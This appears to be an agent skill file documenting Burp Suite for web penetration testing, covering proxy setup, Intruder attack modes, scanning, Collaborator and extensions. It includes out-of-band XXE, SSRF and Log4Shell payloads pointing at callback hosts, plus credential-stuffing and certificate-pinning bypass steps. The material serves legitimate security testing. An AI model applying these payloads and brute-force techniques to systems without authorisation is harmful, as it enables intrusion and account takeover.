---
name: burpsuite
description: >
  Operate Burp Suite Community and Professional for web application penetration
  testing. Use when intercepting HTTP/S traffic, fuzzing parameters, testing
  authentication bypasses, scanning for vulnerabilities, or performing advanced
  web application assessments. Covers proxy setup, Intercept, Repeater, Intruder
  (all attack types), Scanner, Sequencer, Decoder, Comparer, Logger, Collaborator,
  BApp Store extensions (Autorize, Param Miner, JWT Editor, Turbo Intruder,
  ActiveScan++), scope control, session handling, macros, REST API, and Bambda
  filters.
metadata:
  author: redhoundinfosec
  version: '1.0'
  reference: https://portswigger.net/burp
---

# burpsuite Agent Skill

## When to Use This Skill

Use this skill when:
- Intercepting and modifying HTTP/S requests during web app testing
- Fuzzing parameters for SQLi, XSS, IDOR, or authentication bypasses
- Running automated active/passive scanning for vulnerabilities
- Testing JWT authentication, OAuth flows, or session management
- Discovering hidden parameters with Param Miner
- Performing out-of-band (OOB) testing with Burp Collaborator
- The user asks about Burp extensions, macros, session handling, or the REST API

## What Burp Suite Does

Burp Suite is an integrated platform for web application security testing by
PortSwigger. It acts as an intercepting HTTP proxy, allowing testers to view,
modify, and replay traffic between a browser and server. Professional adds an
automated scanner, Collaborator server, and advanced Intruder modes. Community
is free with rate-limited Intruder and no scanner.

## Proxy Setup

### Browser Configuration

```bash
# Option 1: FoxyProxy (Firefox/Chrome extension) — recommended
# Set proxy: 127.0.0.1:8080

# Option 2: System proxy
# macOS: System Settings → Network → Proxies → HTTP Proxy: 127.0.0.1:8080
# Linux: export http_proxy=http://127.0.0.1:8080 https_proxy=http://127.0.0.1:8080

# Option 3: Chromium with proxy flag
chromium --proxy-server="http://127.0.0.1:8080" --ignore-certificate-errors
```

### Installing the CA Certificate (HTTPS Interception)

1. Start Burp Suite → Proxy → Options → verify listening on `127.0.0.1:8080`
2. Browse to `http://burpsuite` or `http://127.0.0.1:8080`
3. Click "CA Certificate" → download `cacert.der`
4. **Firefox**: Settings → Privacy & Security → Certificates → Import → trust for websites
5. **Chrome/Chromium**: Settings → Privacy → Manage Certificates → Authorities → Import
6. **macOS system**: `sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain cacert.der`
7. **Ubuntu**: `sudo cp cacert.der /usr/local/share/ca-certificates/burp.crt && sudo update-ca-certificates`

### Android HTTPS (API Level 24+)
```bash
# Method 1: User cert store + network_security_config.xml modification
# Method 2: Root device, install cert to system store
adb push cacert.der /data/local/tmp/
adb shell "su -c 'mv /data/local/tmp/cacert.der /system/etc/security/cacerts/burp.0'"

# Method 3: Frida SSL pinning bypass (no root needed for some apps)
frida -U -n "com.target.app" -s ssl_pinning_bypass.js
```

## Intercept

Proxy → Intercept tab for real-time request modification.

```
Key shortcuts:
Ctrl+F  — Forward request
Ctrl+D  — Drop request
Ctrl+A  — Select all
Action  — Send to Repeater/Scanner/Intruder
```

**Intercept filters** (Proxy → Options → Intercept Client Requests):
```
File extension: Do not intercept *.js *.css *.png *.jpg *.woff
URL match: Only intercept app.target.com
```

**Match and Replace** (Proxy → Options → Match and Replace):
```
Request header: Replace "User-Agent: ..." with custom UA
Request body:   Replace "role=user" with "role=admin"
Response body:  Replace "isAdmin\":false" with "isAdmin\":true"
```

## Repeater

Manual request replay and modification. Core tool for manual vuln testing.

```
Ctrl+Shift+R  — Send to Repeater
Ctrl+R        — Send (within Repeater)
Ctrl+Z        — Undo
```

Workflow:
1. Intercept a request → Right-click → Send to Repeater
2. Modify headers, parameters, cookies
3. Send and analyze response
4. Chain requests: open multiple tabs for different endpoints

**Useful Repeater features:**
- **Inspector panel**: Structured view of headers, params, cookies
- **Response render**: View HTML responses visually
- **Follow redirects**: Automatically chain redirect responses
- **HTTP/2**: Toggle H2 support per request (Pro only)

## Intruder — Attack Types

Intruder performs automated fuzzing. Mark insertion points with `§payload§`.

### Sniper
One payload set, one position at a time. For testing a single parameter.
```
Positions: username=§admin§&password=test
Payloads:  wordlist of usernames
Result:    Each username tried at position, other params unchanged
```

### Battering Ram
One payload set, same payload inserted at ALL positions simultaneously.
```
Positions: username=§§&password=§§
Payloads:  admin, root, user
Result:    username=admin&password=admin then username=root&password=root
```

### Pitchfork
Two payload sets (A, B), iterated in parallel (like a ZIP).
```
Positions: username=§§&password=§§
PayloadA:  admin, user, root
PayloadB:  password123, hunter2, toor
Result:    admin:password123, user:hunter2, root:toor
```

### Cluster Bomb
Two payload sets, full Cartesian product (every A × every B combination).
```
Positions: username=§§&password=§§
PayloadA:  admin, user (2 values)
PayloadB:  pass1, pass2, pass3 (3 values)
Result:    6 total requests (2 × 3)
```
Use Cluster Bomb for credential stuffing and multi-parameter brute force.

### Intruder Options
```
Grep - Match:   Flag responses containing "Invalid password" / "Welcome"
Grep - Extract: Extract CSRF token from response for use in next attack
Redirections:   Follow redirects during attack
Resource Pool:  Concurrent requests (throttle for stealth)
```

## Scanner (Professional Only)

### Passive Scanning
Analyzes traffic passing through the proxy — no extra requests sent.
Detects: reflected parameters, CSRF, cookie flags, information disclosure.

Enabled by default. View findings: Dashboard → Issue activity

### Active Scanning
Actively sends probes to test for vulnerabilities.
```
Right-click any request → Scan
# or in Target → Site Map → Right-click host → Scan
```

Configure in: Settings → Scan → Scan configuration
- Crawl + Audit: full automated test
- Audit only: use existing site map, just test known endpoints
- Custom: select specific check types (SQLi only, XSS only, etc.)

**Active scan issue types**: SQLi, XSS, XXE, SSRF, SSTI, OS command injection,
path traversal, CORS misconfiguration, HTTP header injection, open redirect.

## Sequencer

Analyzes the entropy/randomness of tokens (session cookies, CSRF tokens).

```
Proxy → HTTP History → find Set-Cookie request → Right-click → Send to Sequencer
Sequencer → Live Capture → Start live capture
Wait for ≥100 samples → Analyze
```

Interpretation:
- **FIPS result ≥ 99%**: Token is effectively random — not predictable
- **FIPS result < 90%**: Token may be predictable — investigate generation algorithm
- Look at "Character-level analysis" for patterns in specific positions

## Decoder

Manual encoding/decoding utility (no need for CyberChef for quick transforms):

```
URL Decode / Encode
HTML Decode / Encode
Base64 Decode / Encode
ASCII Hex Decode / Encode
Gzip Decompress
Smart Decode (auto-detect)
```

Right-click any selected text in Burp → "Send to Decoder"

## Comparer

Diff two requests or responses byte-by-byte.

```
Right-click request A → Send to Comparer (request)
Right-click request B → Send to Comparer (request)
Comparer → Words / Bytes
```

Use cases:
- Compare valid vs invalid session response to find authentication bypass clues
- Diff two user account responses to detect IDOR data leakage
- Compare encrypted tokens to find patterns in CBC mode padding

## Logger (Burp Logging)

**Logger tab** (Pro): Full request/response log with filters.
Community: Use Proxy → HTTP History tab.

```
Filter by: Host, method, status code, response length, annotation
Sort by: Time, status, length
Annotate: Right-click → Add comment, highlight color
```

Export: Proxy → HTTP History → Select all → Copy to file (for reporting)

## Burp Collaborator (OOB Testing)

Collaborator provides out-of-band DNS/HTTP/SMTP callbacks for detecting blind vulns
(blind XXE, blind SSRF, blind SQLi via DNS, log4shell).

```
Burp → Burp Collaborator Client → Copy to clipboard
# Get a URL like: xyz123.oastify.com

# Inject into payload:
# XXE: <!ENTITY xxe SYSTEM "http://xyz123.oastify.com/xxe">
# SSRF: ?url=http://xyz123.oastify.com/test
# Log4Shell: ${jndi:ldap://xyz123.oastify.com/a}

# Poll for interactions:
Collaborator Client → Poll now → Check for DNS/HTTP callbacks
```

Self-host Collaborator (Pro): Settings → Project → Collaborator → Private server.

## BApp Store Extensions

Install: Extensions → BApp Store → search → Install

### Autorize
Tests authorization controls by re-sending requests with lower-privilege cookies.
```
Autorize → configure low-priv cookie → Enable → browse as high-priv user
Green = authorized | Red = should be unauthorized | Orange = requires review
```

### Param Miner
Discovers hidden GET/POST parameters via wordlist + response comparison.
```
Right-click any request → Extensions → Param Miner → Guess params
Options: Guess GET params, POST params, Headers, Cookies
Review: Extender → Output tab for discovered params
```

### JWT Editor
Intercept and modify JWT tokens (alg:none attack, RS256→HS256 confusion, key injection).
```
Repeater → JSON Web Token tab (appears for JWT-bearing requests)
Attacks: Embedded JWK, JWKS Spoof, None Algorithm
```

### Turbo Intruder
Python-scriptable HTTP fuzzer with concurrent request pipeline — bypasses Community
rate limits for Intruder.
```python
# Example script: race condition test
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### ActiveScan++
Extends active scanner with checks for: CORS, CSRF, prototype pollution, HTTP
request smuggling, web cache poisoning, GraphQL introspection.

### Logger++
Enhanced logging with Grepable output and rule-based filtering.

## Scope Control

Prevent Burp from sending requests to out-of-scope hosts.

```
Target → Scope → Add target domain
Or: right-click host in Site Map → Add to scope

Settings → Proxy → Only intercept in-scope items
Settings → Scanner → Only audit in-scope items
```

Scope format supports:
```
https://app.example.com         # exact host
.*\.example\.com                # wildcard subdomain (regex)
https://app.example.com/admin/  # URL prefix scope
```

## Session Handling and Macros

For authenticated scanning where sessions expire or CSRF tokens rotate.

```
Settings → Sessions → Session Handling Rules → Add
Rule: Check session is valid → Run macro to login → Re-run original request
```

**Macro example (CSRF token refresh):**
```
Settings → Sessions → Macros → Add
Step 1: GET /form-page  (captures CSRF token via Grep-Extract)
Step 2: POST /action    (uses captured token)
```

Wire macro to scope: Apply rule to Scanner + Intruder + Repeater for specific URL.

## REST API (Professional)

Burp Suite Pro exposes a REST API for CI/CD integration.

```bash
# Start with API key
burpsuite --headless --api-key=YOUR_KEY --api-port=1337

# Trigger scan via API
curl -X POST 'http://localhost:1337/v0.1/scan' \
  -H 'Content-Type: application/json' \
  -d '{
    "urls": ["https://target.example.com"],
    "scope": {"include": [{"rule": "https://target.example.com"}]},
    "scan_configurations": [{"name": "Audit checks - all issues"}]
  }'

# Check scan status
curl 'http://localhost:1337/v0.1/scan/{task_id}'

# Get issues
curl 'http://localhost:1337/v0.1/scan/{task_id}/issues'
```

## Bambda Filters

Bambda is Burp's Java lambda-based filtering language (replaces simple filters).

```java
// Show only requests with Authorization header
requestResponse.request().hasHeader("Authorization")

// Filter responses with JSON content containing "admin":true
requestResponse.response().bodyToString().contains("\"admin\":true")

// Show requests to /api/ with POST method and 200 response
requestResponse.request().path().contains("/api/") &&
requestResponse.request().method().equals("POST") &&
requestResponse.response().statusCode() == 200

// Flag large responses (potential data dump)
requestResponse.response().body().length() > 100000

// Highlight IDOR candidates: numeric IDs in path
requestResponse.request().path().matches(".*/\\d+.*")
```

## Common Workflows

### Authentication Bypass Testing
```
1. Login as low-priv user → Proxy history → Find admin-only endpoints
2. Send admin request to Repeater → Replace session cookie with low-priv cookie
3. Compare responses: same data = IDOR/authz bypass
4. Use Autorize extension for systematic coverage
```

### SQL Injection via Intruder
```
1. Find parameter → Send to Intruder → Mark §value§
2. Payload: SQLi wordlist (SecLists/Fuzzing/SQLi/)
3. Grep-Match: "SQL syntax", "mysql_fetch", "ORA-", "Unclosed quotation"
4. Grep-Extract: Response differences (error messages, data)
```

### CSRF Token Bypass
```
1. Record login macro (captures CSRF token)
2. Configure Session Handling rule → scope to Intruder
3. Run Intruder attack — macro refreshes token per request
```

## Troubleshooting

**HTTPS not intercepted**: CA cert not trusted. Re-export and reinstall.
Check browser console for NET::ERR_CERT_AUTHORITY_INVALID.

**App bypasses proxy**: App uses certificate pinning. Use Frida/objection to bypass,
or modify network_security_config.xml (Android) and repack APK.

**Intruder slow in Community**: Intentional rate limit. Use Turbo Intruder extension.

**Scanner not finding issues**: Check scope config. Ensure Login macros/session
handling are configured for authenticated endpoints.

**Collaborator not receiving callbacks**: Firewall blocking. Use Burp's public
Collaborator server, or self-host with outbound DNS/HTTP from target.
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [Why Your Penetration Test Report Is Useless (And What to Ask For Instead)](https://redhound.us/pentest-report)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
